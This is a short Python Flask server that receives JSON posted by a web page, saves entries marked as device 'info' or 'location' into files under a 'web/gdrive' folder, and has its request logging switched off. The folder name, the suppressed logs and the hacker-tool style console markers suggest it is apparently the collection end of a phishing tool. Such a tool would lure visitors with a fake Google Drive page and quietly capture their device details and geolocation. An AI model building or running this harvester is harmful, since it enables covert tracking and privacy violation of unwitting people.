from flask import Flask, render_template, request
import logging
import json


app = Flask(__name__)

app.logger.disabled = True
log = logging.getLogger('werkzeug')
log.disabled = True

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

def default(text):
	return G + '[+]' + C + text + W

def error_(text):
	return R + '[-]' + C + text + W 


def alert(text):
	return R + '[!]' + C + text + W


@app.route('/',methods=['POST','GET'])
def index():
	
	if request.method == 'POST':
		data = request.get_json()

		
		try:
			if data['Type'] == 'info':
				with open('web/gdrive/info.txt','w+') as result_file:
					result_file.write(json.dumps(data))
				
			elif data['Type'] == 'location':
				with open('web/gdrive/result.txt','w+') as result_file:
					result_file.write(json.dumps(data))
			else:
				pass
		except:
			with open('web/gdrive/result.txt','w+') as result_file:
					result_file.write(json.dumps(data))
			

			
	return render_template('index.html')


app.run()